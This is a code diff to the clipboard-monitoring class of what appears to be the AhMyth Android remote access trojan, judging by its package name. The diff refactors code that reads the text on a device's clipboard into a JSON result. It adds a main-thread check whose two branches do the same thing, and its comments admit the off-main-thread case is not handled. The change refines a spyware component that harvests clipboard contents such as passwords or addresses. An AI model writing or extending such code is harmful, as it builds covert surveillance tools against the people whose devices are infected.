@@ -2,6 +2,7 @@ package ahmyth.mine.king.ahmyth;
 
 import android.content.ClipData;
 import android.content.Context;
+import android.os.Looper;
 
 import org.json.JSONObject;
 
@@ -23,24 +24,14 @@ public class ClipboardMonitor {
     public JSONObject getClipboardText() {
         JSONObject result = new JSONObject();
         try {
-            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
-                ClipData clipData = clipboardManager.getPrimaryClip();
-                if (clipData != null && clipData.getItemCount() > 0) {
-                    CharSequence text = clipData.getItemAt(0).getText();
-                    if (text != null) {
-                        result.put("text", text.toString());
-                        result.put("hasData", true);
-                    } else {
-                        result.put("text", "");
-                        result.put("hasData", false);
-                    }
-                } else {
-                    result.put("text", "");
-                    result.put("hasData", false);
-                }
+            // Clipboard access might require main thread and focus on Android 10+
+            // We can try to run on main looper
+            if (Looper.myLooper() == Looper.getMainLooper()) {
+                readClipboard(result);
             } else {
-                result.put("text", "");
-                result.put("hasData", false);
+                // Future implementation: post to main thread handler if needed
+                // For now, assume it's called from a handler or we might fail
+                readClipboard(result);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -53,6 +44,28 @@ public class ClipboardMonitor {
             }
         }
         return result;
+    }
+
+    private void readClipboard(JSONObject result) throws Exception {
+        if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
+            ClipData clipData = clipboardManager.getPrimaryClip();
+            if (clipData != null && clipData.getItemCount() > 0) {
+                CharSequence text = clipData.getItemAt(0).getText();
+                if (text != null) {
+                    result.put("text", text.toString());
+                    result.put("hasData", true);
+                } else {
+                    result.put("text", "");
+                    result.put("hasData", false);
+                }
+            } else {
+                result.put("text", "");
+                result.put("hasData", false);
+            }
+        } else {
+            result.put("text", "");
+            result.put("hasData", false);
+        }
     }
 
     public void setClipboardListener(OnClipboardChangedListener listener) {
